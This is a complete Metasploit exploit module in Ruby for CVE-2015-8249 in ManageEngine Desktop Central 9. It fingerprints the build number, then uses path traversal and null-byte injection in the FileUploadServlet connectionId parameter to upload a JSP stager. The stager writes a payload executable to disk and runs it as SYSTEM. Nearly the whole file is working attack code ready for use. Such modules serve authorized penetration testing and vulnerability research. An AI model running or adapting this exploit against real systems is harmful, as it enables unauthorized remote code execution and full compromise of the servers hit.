##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'nokogiri'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability found in ManageEngine Desktop Central 9. When
        uploading a 7z file, the FileUploadServlet class does not check the user-controlled
        ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to
        inject a null bye at the end of the value to create a malicious file with an arbitrary
        file type, and then place it under a directory that allows server-side scripts to run,
        which results in remote code execution under the context of SYSTEM.

        Please note that by default, some ManageEngine Desktop Central versions run on port 8020,
        but older ones run on port 8040. Also, using this exploit will leave debugging information
        produced by FileUploadServlet in file rdslog0.txt.

        This exploit was successfully tested on version 9, build 90109 and build 91084.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'References'     =>
        [
          [ 'URL', 'https://community.rapid7.com/community/infosec/blog/2015/12/14/r7-2015-22-manageengine-desktop-central-9-fileuploadservlet-connectionid-vulnerability-cve-2015-8249' ],
          [ 'CVE', '2015-8249']
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'ManageEngine Desktop Central 9 on Windows', {} ]
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00"
        },
      'Privileged'     => false,
      'DisclosureDate' => "Dec 14 2015",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for ManageEngine Desktop Central', '/']),
        Opt::RPORT(8020)
      ], self.class)
  end

  def jsp_drop_bin(bin_data, output_file)
    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
    jspraw << %Q|<%\n|
    jspraw << %Q|String data = "#{Rex::Text.to_hex(bin_data, "")}";\n|

    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream("#{output_file}");\n|

    jspraw << %Q|int numbytes = data.length();\n|

    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\n|
    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\n|
    jspraw << %Q|{\n|
    jspraw << %Q|  char char1 = (char) data.charAt(counter);\n|
    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\n|
    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\n|
    jspraw << %Q|  comb <<= 4;\n|
    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\n|
    jspraw << %Q|  bytes[counter/2] = (byte)comb;\n|
    jspraw << %Q|}\n|

    jspraw << %Q|outputstream.write(bytes);\n|
    jspraw << %Q|outputstream.close();\n|
    jspraw << %Q|%>\n|

    jspraw
  end

  def jsp_execute_command(command)
    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
    jspraw << %Q|<%\n|
    jspraw << %Q|try {\n|
    jspraw << %Q|  Runtime.getRuntime().exec("chmod +x #{command}");\n|
    jspraw << %Q|} catch (IOException ioe) { }\n|
    jspraw << %Q|Runtime.getRuntime().exec("#{command}");\n|
    jspraw << %Q|%>\n|

    jspraw
  end

  def get_jsp_stager
    exe = generate_payload_exe(code: payload.encoded)
    jsp_fname = "#{Rex::Text.rand_text_alpha(5)}.jsp"
    # pwd: C:\ManageEngine\DesktopCentral_Server\bin
    # targeted location: C:\ManageEngine\DesktopCentral_Server\webapps\DesktopCentral\jspf
    register_files_for_cleanup("../webapps/DesktopCentral/jspf/#{jsp_fname}")

    {
      jsp_payload: jsp_drop_bin(exe, jsp_fname) + jsp_execute_command(jsp_fname),
      jsp_name:    jsp_fname
    }
  end

  def get_build_number(res)
    inputs = res.get_hidden_inputs
    # The buildNum input is in the first form
    inputs.first['buildNum']
  end

  def get_html_title(res)
    html = res.body
    n = ::Nokogiri::HTML(html)
    n.at_xpath('//title').text
  end

  def check
    uri = normalize_uri(target_uri.path, '/configurations.do')

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri
    })

    unless res
      vprint_error("Connection timed out")
      return Exploit::CheckCode::Unknown
    end

    build_number = get_build_number(res)
    vprint_status("Found build number: #{build_number}")

    html_title   = get_html_title(res)
    vprint_status("Found title: #{html_title}")

    if build_number <= '91084'
      return Exploit::CheckCode::Appears
    elsif /ManageEngine Desktop Central/ === html_title
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end

  def upload_jsp(stager_info)
    # connectionId is part of the 7z filename
    # computerName is part of the 7z filename (but will be used due to the null byte injection)
    # customerId is used as a directory name
    #
    # The intended upload path is:
    # C:\ManageEngine\DesktopCentral_Server\webapps\DesktopCentral\server-data\[customerId]\rds\scr-rec\null-computerName-connectionId.7z
    # But this will upload to:
    # C:\ManageEngine\DesktopCentral_Server\webapps\DesktopCentral\jspf

    uri = normalize_uri(target_uri.path, 'fileupload')

    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => uri,
      'ctype'    => 'application/octet-stream',
      'encode_params' => false,
      'data'     => stager_info[:jsp_payload],
      'vars_get' => {
        'connectionId' => "#{Rex::Text.rand_text_alpha(1)}/../../../../../jspf/#{stager_info[:jsp_name]}%00",
        'resourceId'   => Rex::Text.rand_text_alpha(1),
        'action'       => 'rds_file_upload',
        'computerName' => Rex::Text.rand_text_alpha(rand(10)+5),
        'customerId'   => Rex::Text.rand_text_numeric(rand(10)+5)
      }
    })

    if res.nil?
      fail_with(Failure::Unknown, "Connection timed out while uploading to #{uri}")
    elsif res && res.code != 200
      fail_with(Failure::Unknown, "The server returned #{res.code}, but 200 was expected.")
    end
  end

  def exec_jsp(stager_info)
    uri = normalize_uri(target_uri.path, "/jspf/#{stager_info[:jsp_name]}")

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri
    })

    if res.nil?
      fail_with(Failure::Unknown, "Connection timed out while executing #{uri}")
    elsif res && res.code != 200
      fail_with(Failure::Unknown, "Failed to execute #{uri}. Server returned #{res.code}")
    end
  end

  def exploit
    print_status("Creating JSP stager")
    stager_info = get_jsp_stager

    print_status("Uploading JSP stager #{stager_info[:jsp_name]}...")
    upload_jsp(stager_info)

    print_status("Executing stager...")
    exec_jsp(stager_info)
  end

end
